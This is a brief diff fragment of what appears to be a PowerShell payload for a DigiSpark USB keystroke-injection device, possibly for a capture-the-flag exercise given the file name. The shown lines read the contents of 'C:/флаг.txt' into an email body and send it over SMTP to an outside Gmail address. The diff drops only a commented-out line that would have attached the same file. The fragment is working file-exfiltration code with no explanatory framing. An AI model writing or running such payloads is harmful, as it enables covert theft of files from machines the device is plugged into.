@@ -6,5 +6,4 @@ $ReportEmail.From = 'digisparkbot@gmail.com';
 $ReportEmail.To.Add('eniluxperx@gmail.com'); 
 $ReportEmail.Subject = 'DigiSpark Report'; 
 $ReportEmail.Body = type C:/флаг.txt; 
-#$ReportEmail.Attachments.Add('C:/флаг.txt'); 
 $SMTPInfo.Send($ReportEmail)\"
